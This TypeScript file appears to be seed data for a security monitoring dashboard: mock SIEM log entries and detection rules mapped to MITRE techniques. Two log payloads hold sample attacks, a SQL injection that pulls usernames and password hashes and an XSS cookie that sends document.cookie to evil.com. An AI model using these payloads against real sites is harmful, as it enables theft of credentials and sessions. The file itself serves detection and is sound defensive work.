import { SIEMLog } from '../types';

export const INITIAL_SIEM_LOGS: SIEMLog[] = [
  {
    id: 'log-1001',
    timestamp: '2026-11-04 09:14:02',
    sourceIp: '198.51.100.42',
    destIp: '10.0.1.10',
    port: 22,
    protocol: 'SSH',
    action: 'BLOCK',
    severity: 'High',
    signature: 'SSH Brute Force Attempt (Failed Login > 15 attempts)',
    category: 'Authentication',
    rawPayload: 'sshd[19842]: Failed password for invalid user admin from 198.51.100.42 port 49211 ssh2'
  },
  {
    id: 'log-1002',
    timestamp: '2026-11-04 09:14:15',
    sourceIp: '185.220.101.5',
    destIp: '10.0.1.80',
    port: 80,
    protocol: 'HTTP',
    action: 'ALERT',
    severity: 'Critical',
    signature: 'OWASP-A1 SQL Injection in Query String: UNION SELECT detected',
    category: 'Intrusion',
    rawPayload: 'GET /api/products?cat=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20users-- HTTP/1.1 User-Agent: sqlmap/1.7'
  },
  {
    id: 'log-1003',
    timestamp: '2026-11-04 09:14:28',
    sourceIp: '10.0.2.45',
    destIp: '8.8.8.8',
    port: 53,
    protocol: 'DNS',
    action: 'ALLOW',
    severity: 'Informational',
    signature: 'Standard Outbound DNS Query: api.github.com',
    category: 'Network Scan',
    rawPayload: 'named[402]: client @0x7f4 10.0.2.45#54210 (api.github.com): query: api.github.com IN A + (10.0.1.2)'
  },
  {
    id: 'log-1004',
    timestamp: '2026-11-04 09:14:45',
    sourceIp: '10.0.3.119',
    destIp: '194.26.29.112',
    port: 443,
    protocol: 'HTTPS',
    action: 'ALERT',
    severity: 'Critical',
    signature: 'Threat Intel Match: Destination IP flagged as Cobalt Strike C2 Node',
    category: 'Malware',
    rawPayload: 'TCP connection established to known malicious infrastructure 194.26.29.112:443. SSL cert subject: CN=default-c2'
  },
  {
    id: 'log-1005',
    timestamp: '2026-11-04 09:15:02',
    sourceIp: '192.168.1.104',
    destIp: '10.0.0.5',
    port: 445,
    protocol: 'TCP',
    action: 'BLOCK',
    severity: 'High',
    signature: 'Lateral Movement Attempt: PsExec remote service creation blocked',
    category: 'Policy Violation',
    rawPayload: 'Event 7045: Service "PSEXESVC" was denied installation by endpoint defense policy'
  },
  {
    id: 'log-1006',
    timestamp: '2026-11-04 09:15:19',
    sourceIp: '45.33.32.156',
    destIp: '10.0.1.10',
    port: 8080,
    protocol: 'HTTP',
    action: 'DROP',
    severity: 'Medium',
    signature: 'Port Scan Sweep: TCP SYN packet to unopened port 8080',
    category: 'Network Scan',
    rawPayload: 'iptables-DROP: IN=eth0 OUT= SRC=45.33.32.156 DST=10.0.1.10 PROTO=TCP SPT=55102 DPT=8080 FLAGS=SYN'
  },
  {
    id: 'log-1007',
    timestamp: '2026-11-04 09:15:33',
    sourceIp: '10.0.2.14',
    destIp: '10.0.1.20',
    port: 3389,
    protocol: 'TCP',
    action: 'ALLOW',
    severity: 'Low',
    signature: 'Authorized Administrative RDP Session Initiated',
    category: 'Authentication',
    rawPayload: 'TermDD 56: RDP connection from admin_laptop (10.0.2.14) accepted for DOMAIN\\admin.josh'
  },
  {
    id: 'log-1008',
    timestamp: '2026-11-04 09:15:50',
    sourceIp: '185.190.140.22',
    destIp: '10.0.1.80',
    port: 443,
    protocol: 'HTTPS',
    action: 'ALERT',
    severity: 'High',
    signature: 'WAF Rule Trigger: Cross-Site Scripting (XSS) in Cookie Header',
    category: 'Intrusion',
    rawPayload: 'Cookie: sessionid=test; comment=<script>document.location="http://evil.com/"+document.cookie</script>'
  }
];

export interface SIEMDetectionRule {
  id: string;
  name: string;
  description: string;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  mitreTechnique: string;
  queryFilter: string;
  enabled: boolean;
}

export const SIEM_RULES: SIEMDetectionRule[] = [
  {
    id: 'rule-01',
    name: 'Brute Force Authentication Surge',
    description: 'Triggers when more than 5 failed authentication attempts are detected from a single external IP within 60 seconds.',
    severity: 'High',
    mitreTechnique: 'T1110 (Brute Force)',
    queryFilter: 'category == "Authentication" && action == "BLOCK"',
    enabled: true
  },
  {
    id: 'rule-02',
    name: 'Web Application Injection Attack',
    description: 'Detects SQL injection or Cross-Site Scripting payloads within HTTP/HTTPS parameters.',
    severity: 'Critical',
    mitreTechnique: 'T1190 (Exploit Public-Facing Application)',
    queryFilter: 'category == "Intrusion" && (protocol == "HTTP" || protocol == "HTTPS")',
    enabled: true
  },
  {
    id: 'rule-03',
    name: 'Cobalt Strike C2 Beaconing Telemetry',
    description: 'Detects outbound connections matching known adversary command-and-control IP addresses or default SSL certificates.',
    severity: 'Critical',
    mitreTechnique: 'T1071 (Application Layer Protocol)',
    queryFilter: 'category == "Malware" && severity == "Critical"',
    enabled: true
  },
  {
    id: 'rule-04',
    name: 'Unauthorized Remote Service Deployment (PsExec)',
    description: 'Detects PsExec or WMI lateral movement attempts targeting internal domain servers.',
    severity: 'High',
    mitreTechnique: 'T1021.002 (SMB/Windows Admin Shares)',
    queryFilter: 'category == "Policy Violation" && port == 445',
    enabled: true
  }
];
